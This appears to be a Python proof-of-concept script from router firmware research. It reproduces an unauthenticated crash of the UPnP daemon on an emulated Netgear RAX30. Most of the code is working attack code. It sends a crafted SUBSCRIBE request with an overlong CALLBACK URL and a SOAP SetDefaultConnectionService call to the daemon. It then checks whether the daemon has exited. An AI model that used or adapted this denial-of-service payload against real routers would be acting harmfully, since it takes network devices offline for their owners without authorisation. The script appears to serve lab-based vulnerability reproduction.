#!/usr/bin/env python3
"""Minimal candidate reproducer for an unauthenticated RAX30 UPnP daemon exit."""

from __future__ import annotations

import argparse
import re
import socket
import sys
import time
from pathlib import Path


HOST = "127.0.0.1"
PORT = 26_688
SERIAL = (
    Path(__file__).resolve().parents[1]
    / "known_firmware/emulation/RAX30/full-system-lab/upnp-serial.log"
)


def exchange(payload: bytes, port: int = PORT, timeout: float = 3.0) -> bytes:
    response = bytearray()
    with socket.create_connection((HOST, port), timeout=timeout) as client:
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        while True:
            try:
                chunk = client.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def request(method: str, path: str, headers: list[tuple[str, str]], body: bytes = b"") -> bytes:
    fields = [
        ("Host", "10.0.2.15:56688"),
        ("Connection", "close"),
        *headers,
        ("Content-Length", str(len(body))),
    ]
    return (
        f"{method} {path} HTTP/1.1\r\n".encode()
        + b"".join(f"{name}: {value}\r\n".encode() for name, value in fields)
        + b"\r\n"
        + body
    )


def status(response: bytes) -> str:
    return response.splitlines()[0].decode(errors="replace") if response else "no response"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--control",
        action="store_true",
        help="send the short non-crashing callback control instead of the candidate",
    )
    parser.add_argument(
        "--no-port",
        action="store_true",
        help="use the reduced short callback without an explicit port",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=PORT,
        help=f"localhost lab-forward port (default: {PORT})",
    )
    parser.add_argument(
        "--serial",
        type=Path,
        default=SERIAL,
        help="guest serial transcript used to recover the generated SSDP UUID",
    )
    args = parser.parse_args()
    serial = args.serial.read_text(errors="replace")
    locations = re.findall(r"Location: http://[^/]+/dyndev/(uuid:[0-9a-f-]+)", serial)
    if not locations:
        raise SystemExit("no SSDP UUID in serial log")
    uuid = locations[-1]
    path = f"/{uuid}/Layer3Forwarding:1"
    marker = "FRIDAY_RAX30_EVENT_DOS_REPRO"
    if args.control:
        callback = "http://10.0.2.2:9/event"
    elif args.no_port:
        callback = "http://10.0.2.2/event"
    else:
        callback = "http://10.0.2.2/" + "FRIDAY_RAX30_PROBE_7b6f2a" + "A" * 32
    body = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
        '<s:Body><u:SetDefaultConnectionService '
        'xmlns:u="urn:schemas-upnp-org:service:Layer3Forwarding:1">'
        f"<NewDefaultConnectionService>{marker}</NewDefaultConnectionService>"
        "</u:SetDefaultConnectionService></s:Body></s:Envelope>"
    ).encode()
    subscribe = request(
        "SUBSCRIBE",
        path,
        [
            ("CALLBACK", f"<{callback}>"),
            ("NT", "upnp:event"),
        ],
    )
    event = request(
        "POST",
        path,
        [
            ("Content-Type", "text/xml"),
            (
                "SOAPACTION",
                '"urn:schemas-upnp-org:service:Layer3Forwarding:1'
                '#SetDefaultConnectionService"',
            ),
        ],
        body,
    )

    baseline = exchange(request("GET", "/", []), args.port)
    print(f"baseline={status(baseline)}")
    subscribed = exchange(subscribe, args.port)
    print(f"subscribe={status(subscribed)}")
    # The candidate reduced further: the crafted SUBSCRIBE itself terminates
    # the daemon before an event-producing SOAP request is required.
    time.sleep(3)
    try:
        post = exchange(request("GET", "/", []), args.port)
        print(f"post={status(post)}")
        healthy = status(post) == "HTTP/1.1 404 Not Found"
    except OSError as exc:
        print(f"post={type(exc).__name__}: {exc}")
        healthy = False
    new_serial = args.serial.read_text(errors="replace")
    print(f"daemon_exit={'UPNP_EXITED=1' in new_serial}")
    print(f"marker_visible={marker in new_serial}")
    return 0 if healthy else 1


if __name__ == "__main__":
    sys.exit(main())
